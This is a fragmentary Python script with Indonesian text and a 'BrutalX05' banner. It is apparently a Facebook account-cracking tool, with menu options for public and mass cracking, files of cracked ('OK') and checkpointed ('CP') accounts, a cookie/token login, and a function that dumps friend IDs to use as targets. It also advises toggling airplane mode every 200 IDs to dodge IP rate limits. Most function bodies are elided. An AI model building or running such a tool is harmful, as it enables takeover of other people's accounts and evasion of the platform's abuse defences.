...
|  _ \           | |      | \ \ / / _ \| ____|
| |_) |_ __ _   _| |_ __ _| |\ V / | | | |__  
|  _ <| '__| | | | __/ _` | | > <| | | |___ \ 
| |_) | |  | |_| | || (_| | |/ . \ |_| |___) |
|____/|_|   \__,_|\__\__,_|_/_/ \_\___/|____/ 
''')
#kukis
def login():
	os.system('clear')
...
def menu():
	...
	os.system('clear')
	banner()
	prints(panel(f"""[yellow][[cyan]1[red]] Crack Publik [white]] \n[[cyan]2[red]] Crack Massal [white]  [white]] \n[[cyan]3[red]] Hasil  [white][ [red]CP  [white] [white]] \n[[cyan]4[red]] Hasil  [white][ [red]OK  [white] [white]] \n[[cyan]5[red]] Ganti cookiesl  [white][ [yellow]Jalankan ulang sc ulangi sampai bisa ke bagian menu ini lagi!!! [white]]""",width=43,title=f"[[green] SILAHKAN TUAN [/]]",style=f"yellow"))
	print(f"{kun}|========================================================{puti}")
...
def dump(idt,fields,cookie,token):
	try:
		...
		for i in url["friends"]["data"]:
			...
			sys.stdout.write(f"\r\==[ sabar cok, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
...
def atur_method():
	...
	print(f'{kun}\==[{puti} 03. Asyinc [dalam perbaikan] ')      
	print(f"{kun}|========================================================{puti}")
...
def passwordlist():
	global prog,des
	print(f"{kun}|========================================================{puti}")
	print(f'{kun}\==[{puti} Hidupkan mode pesawat setiap 200 ID selama 15 detik biar gk spam ip  ')
	print(f"{kun}|========================================================{puti}")
